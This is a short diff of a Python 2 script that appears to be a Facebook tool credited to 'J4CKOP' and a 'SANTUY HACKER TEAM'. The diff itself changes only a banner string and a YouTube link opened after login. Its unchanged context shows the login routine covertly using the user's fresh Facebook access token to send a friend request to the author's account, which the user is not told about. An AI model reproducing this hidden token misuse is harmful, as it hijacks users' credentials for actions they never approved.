@@ -23,7 +23,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;91m* \x1b[1;93mAuthor  \x1b[1;91m: \x1b[1;96mJ4CKOP\x1b[1;97m\n\x1b[1;91m* \x1b[1;93mSupport \x1b[1;91m: \x1b[1;96mSANTUY HACKER TEAM \x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;91mMR.3XJ4CK0P\n\x1b[1;91m* \x1b[1;93mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/J4CK0P\x1b[1;91m   \x1b[*] BY J4CKOP\n\x1b[1;93m JANGAN LUPA FOLLOW FB SAYA Azis Wirahadi Kusuma'
+logo = '\x1b[1;91m* \x1b[1;93mAuthor  \x1b[1;91m: \x1b[1;96mJ4CKOP\x1b[1;97m\n\x1b[1;91m* \x1b[1;93mSupport \x1b[1;91m: \x1b[1;96mSANTUY HACKER TEAM \x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;91mMR.3XJ4CK0P\n\x1b[1;91m* \x1b[1;93mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/J4CK0P\x1b[1;91m   \x1b[*] BY J4CKOP\n\x1b[1;93m JANGAN LUPA FOLLOW FB SAYA Azis Wirahadi'
 
 def tik():
     titik = [
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/channel/UCPWw9wqDL0_1C7AtyVDwwrQ')
+                os.system('xdg-open https://www.youtube.com/channel/UCn82YGg7CnKcZh7QaNkLT8Q')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
